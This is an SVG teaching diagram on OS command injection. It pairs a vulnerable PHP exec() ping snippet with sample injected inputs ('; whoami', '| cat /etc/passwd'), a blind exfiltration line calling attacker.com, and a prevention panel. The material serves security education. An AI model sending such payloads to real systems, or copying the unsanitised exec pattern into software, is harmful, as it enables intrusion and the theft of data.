<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720">
  <!-- palette: resources/palette_diagram.yaml -->
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #f5f5f5;
        --border: #e0e0e0;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000022;
        --black: #000000;
        --primary-fill: #2196f3;
        --primary-border: #1565c0;
        --primary-text: #ffffff;
        --primary-accent: #0d47a1;
        --ok-fill: #4caf50;
        --ok-border: #2e7d32;
        --ok-text: #ffffff;
        --ok-accent: #1b5e20;
        --warn-fill: #ff9800;
        --warn-border: #e65100;
        --warn-text: #ffffff;
        --warn-accent: #bf360c;
        --danger-fill: #e74c3c;
        --danger-border: #c62828;
        --danger-text: #ffffff;
        --danger-accent: #b71c1c;
        --info-fill: #9c27b0;
        --info-border: #6a1b9a;
        --info-text: #ffffff;
        --info-accent: #4a148c;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#2196f3"/>
      <stop offset="100%" stop-color="#1565c0"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#f5f5f5"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#4caf50"/>
      <stop offset="100%" stop-color="#2e7d32"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ff9800"/>
      <stop offset="100%" stop-color="#e65100"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#e74c3c"/>
      <stop offset="100%" stop-color="#c62828"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9c27b0"/>
      <stop offset="100%" stop-color="#6a1b9a"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#00000022"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#2e7d32"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#e65100"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#c62828"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#6a1b9a"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>

    <linearGradient id="grad-accent" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#1e88e5" />
      <stop offset="100%" stop-color="#1565c0" />
    </linearGradient>
    <marker id="arrow-accent" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0" />
    </marker>
  </defs>
  <rect width="1200" height="580" fill="var(--bg)" rx="6" x="40" y="40"/>
  <rect x="68.125" y="88.3333" width="196.875" height="104.7223" rx="6" fill="var(--danger-fill)" filter="url(#shadow)" stroke="var(--danger-border)" stroke-width="2" />
  <text x="166.5625" y="112.5" font-family="Arial,sans-serif" font-size="12.1663" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Attacker Input</text>
  <text x="86.875" y="133.4444" font-family="monospace" font-size="10.4284" fill="var(--text-muted)">127.0.0.1; whoami</text>
  <text x="86.875" y="149.5556" font-family="monospace" font-size="10.4284" fill="var(--text-muted)">| cat /etc/passwd</text>
  <text x="86.875" y="165.6667" font-family="monospace" font-size="10.4284" fill="var(--text-muted)">&amp;&amp; id</text>
  <text x="86.875" y="183.3889" font-family="monospace" font-size="10.4284" fill="var(--text-muted)">`ls -la`</text>
  <line x1="265" y1="140.6944" x2="330.625" y2="140.6944" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
  <text x="297.8124" y="132.6389" font-family="Arial,sans-serif" font-size="10" fill="var(--danger-accent)" text-anchor="middle">HTTP GET/POST</text>
  <rect x="330.625" y="80.2777" width="253.125" height="136.9444" rx="6" fill="var(--warn-fill)" filter="url(#shadow)" stroke="var(--warn-border)" stroke-width="2" />
  <rect x="330.625" y="80.2777" width="253.125" height="29" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2"/>
  <rect x="330.625" y="99.6111" width="253.125" height="9.6667" fill="var(--warn-fill)" rx="6" stroke="var(--warn-border)" stroke-width="2"/>
  <text x="457.1875" y="98.8056" font-family="Arial,sans-serif" font-size="13.0354" font-weight="bold" fill="var(--bg)" text-anchor="middle">Web Application</text>
  <text x="349.375" y="125.3889" font-family="monospace" font-size="10" fill="var(--text-muted)">$host = $_GET['host'];</text>
  <text x="349.375" y="139.8889" font-family="monospace" font-size="10" fill="var(--text-muted)">$cmd = "ping -c 1 " . $host;</text>
  <text x="349.375" y="154.3889" font-family="monospace" font-size="10" fill="var(--danger-accent)">exec($cmd, $output);</text>
  <text x="349.375" y="172.9167" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">No sanitisation!</text>
  <text x="349.375" y="187.4167" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Unsanitised input → shell string</text>
  <line x1="583.75" y1="148.75" x2="649.375" y2="148.75" stroke="var(--text-muted)" stroke-width="2" marker-end="url(#arrow)" />
  <text x="616.5625" y="140.6944" font-family="Arial,sans-serif" font-size="10" fill="var(--text-muted)" text-anchor="middle">shell call</text>
  <rect x="649.375" y="88.3333" width="299.9999" height="136.9444" rx="6" fill="var(--ok-fill)" filter="url(#shadow)" stroke="var(--ok-border)" stroke-width="2" />
  <rect x="649.375" y="88.3333" width="299.9999" height="29" rx="6" fill="var(--ok-accent)" />
  <rect x="649.375" y="107.6667" width="299.9999" height="9.6667" fill="var(--ok-accent)" rx="6"/>
  <text x="799.375" y="106.8611" font-family="Arial,sans-serif" font-size="13.0354" font-weight="bold" fill="var(--bg)" text-anchor="middle">Shell (/bin/sh)</text>
  <text x="668.125" y="135.0556" font-family="monospace" font-size="10.4284" fill="var(--text)">$ ping -c 1 127.0.0.1; whoami</text>
  <text x="668.125" y="154.3889" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Parsed as TWO commands:</text>
  <text x="668.125" y="170.5" font-family="monospace" font-size="10.4284" fill="var(--ok-accent)">  ping -c 1 127.0.0.1</text>
  <text x="668.125" y="185" font-family="monospace" font-size="10.4284" fill="var(--danger-accent)">  whoami              ← injected!</text>
  <text x="668.125" y="214" font-family="Arial,sans-serif" font-size="10" fill="var(--text-muted)">Runs as web server user (www-data/apache)</text>
  <line x1="949.375" y1="156.8056" x2="1014.9999" y2="156.8056" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
  <text x="982.1874" y="148.75" font-family="Arial,sans-serif" font-size="10" fill="var(--danger-accent)" text-anchor="middle">syscall</text>
  <rect x="1014.9999" y="104.4444" width="196.875" height="88.6111" rx="6" fill="var(--danger-fill)" filter="url(#shadow)" stroke="var(--danger-border)" stroke-width="2" />
  <text x="1113.4375" y="131.0277" font-family="Arial,sans-serif" font-size="12.1663" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">OS</text>
  <text x="1113.4375" y="148.75" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" text-anchor="middle">www-data</text>
  <text x="1113.4375" y="166.4723" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)" text-anchor="middle">output returned</text>
  <text x="1113.4375" y="180.9723" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)" text-anchor="middle">to attacker</text>
  <rect x="68.125" y="241.3889" width="553.1249" height="161.1111" rx="6" fill="var(--surface)" filter="url(#shadow)" stroke="var(--border)" stroke-width="1" />
  <text x="344.6875" y="263.9444" font-family="Arial,sans-serif" font-size="13.0354" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Shell Metacharacters Used in Injection</text>
  <rect x="86.875" y="273.6111" width="520.3125" height="22.5556" rx="6" fill="var(--surface)" />
  <text x="115" y="288.9167" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" font-weight="bold">;</text>
  <text x="147.8125" y="288.9167" font-family="Arial,sans-serif" font-size="11.2974" fill="var(--text)">Command separator — always runs next command</text>
  <rect x="86.875" y="299.3889" width="520.3125" height="22.5556" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2"/>
  <text x="115" y="314.6944" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" font-weight="bold">|</text>
  <text x="147.8125" y="314.6944" font-family="Arial,sans-serif" font-size="11.2974" fill="var(--text)">Pipe — stdout of cmd1 becomes stdin of cmd2</text>
  <rect x="86.875" y="325.1667" width="520.3125" height="22.5556" rx="6" fill="var(--surface)" />
  <text x="115" y="340.4723" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" font-weight="bold">&amp;&amp;</text>
  <text x="147.8125" y="340.4723" font-family="Arial,sans-serif" font-size="11.2974" fill="var(--text)">AND — cmd2 only if cmd1 succeeds (exit 0)</text>
  <rect x="86.875" y="350.9444" width="520.3125" height="22.5556" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2"/>
  <text x="115" y="366.25" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" font-weight="bold">||</text>
  <text x="147.8125" y="366.25" font-family="Arial,sans-serif" font-size="11.2974" fill="var(--text)">OR — cmd2 only if cmd1 fails</text>
  <rect x="86.875" y="376.7223" width="520.3125" height="22.5556" rx="6" fill="var(--surface)" />
  <text x="115" y="392.0277" font-family="monospace" font-size="11.2974" fill="var(--danger-accent)" font-weight="bold">` `  or $( )</text>
  <text x="194.6875" y="392.0277" font-family="Arial,sans-serif" font-size="11.2974" fill="var(--text)">Backticks / subshell — command substitution</text>
  <rect x="649.375" y="241.3889" width="562.5" height="161.1111" rx="6" fill="var(--surface)" filter="url(#shadow)" stroke="var(--border)" stroke-width="1" />
  <text x="930.6249" y="263.9444" font-family="Arial,sans-serif" font-size="13.0354" font-weight="bold" fill="var(--text)" text-anchor="middle">Blind vs Visible Injection</text>
  <rect x="668.125" y="273.6111" width="243.75" height="116.8056" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
  <text x="790" y="292.1389" font-family="Arial,sans-serif" font-size="11.2974" font-weight="bold" fill="var(--primary-accent)" text-anchor="middle">Visible (In-Band)</text>
  <text x="686.875" y="309.8611" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">Output appears in response</text>
  <text x="686.875" y="325.9723" font-family="monospace" font-size="10" fill="var(--text-muted)">; cat /etc/passwd</text>
  <text x="686.875" y="342.0833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Response contains file content</text>
  <text x="686.875" y="358.1944" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Easiest to exploit</text>
  <text x="686.875" y="374.3056" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Confirm with: echo 1234567890</text>
  <rect x="949.375" y="273.6111" width="243.75" height="116.8056" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
  <text x="1071.25" y="292.1389" font-family="Arial,sans-serif" font-size="11.2974" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Blind (Out-of-Band)</text>
  <text x="968.125" y="309.8611" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">No output in response</text>
  <text x="968.125" y="325.9723" font-family="monospace" font-size="10" fill="var(--text-muted)">; sleep 5</text>
  <text x="968.125" y="342.0833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">Time-based detection</text>
  <text x="968.125" y="358.1944" font-family="monospace" font-size="10" fill="var(--text-muted)">; curl attacker.com/$(id)</text>
  <text x="968.125" y="374.3056" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">DNS/HTTP out-of-band exfil</text>
  <rect x="68.125" y="426.6667" width="1143.7499" height="169.1667" rx="6" fill="var(--ok-fill)" filter="url(#shadow)" stroke="var(--ok-border)" stroke-width="2" />
  <text x="640" y="449.2223" font-family="Arial,sans-serif" font-size="13.9044" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Prevention</text>
  <rect x="86.875" y="458.8889" width="328.125" height="120.8333" rx="6" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
  <text x="250.9375" y="477.4167" font-family="Arial,sans-serif" font-size="11.2974" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Avoid shell execution</text>
  <text x="105.625" y="495.1389" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• Use language APIs not shell commands</text>
  <text x="105.625" y="511.25" font-family="monospace" font-size="10" fill="var(--text-muted)">subprocess.run(['ping','-c','1',host])</text>
  <text x="105.625" y="527.3611" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">  (list form — no shell interpretation)</text>
  <text x="105.625" y="543.4723" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Never pass user input to exec/system</text>
  <text x="105.625" y="559.5833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Use whitelists, not blacklists</text>
  <text x="105.625" y="574.0833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Reject inputs not matching regex pattern</text>
  <rect x="443.125" y="458.8889" width="356.25" height="120.8333" rx="6" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
  <text x="621.25" y="477.4167" font-family="Arial,sans-serif" font-size="11.2974" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Sanitise if shell is unavoidable</text>
  <text x="461.875" y="495.1389" font-family="monospace" font-size="10" fill="var(--text-muted)">escapeshellarg($input)   # PHP</text>
  <text x="461.875" y="511.25" font-family="monospace" font-size="10" fill="var(--text-muted)">shlex.quote(input)       # Python</text>
  <text x="461.875" y="527.3611" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Wrap input in single quotes</text>
  <text x="461.875" y="543.4723" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Escape: ; | &amp; ` $ &gt; &lt; ! \</text>
  <text x="461.875" y="559.5833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text-muted)">• Drop non-alphanumeric chars</text>
  <rect x="827.5" y="458.8889" width="365.625" height="120.8333" rx="6" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
  <text x="1010.3125" y="477.4167" font-family="Arial,sans-serif" font-size="11.2974" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Defence-in-depth</text>
  <text x="846.2499" y="495.1389" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• Run web server as low-privilege user</text>
  <text x="846.2499" y="511.25" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• Use WAF rules to block metacharacters</text>
  <text x="846.2499" y="527.3611" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• AppArmor / SELinux mandatory access</text>
  <text x="846.2499" y="543.4723" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• Containers: restrict /bin and /usr/bin</text>
  <text x="846.2499" y="559.5833" font-family="Arial,sans-serif" font-size="10.4284" fill="var(--text)">• Log all exec() / system() calls</text>
</svg>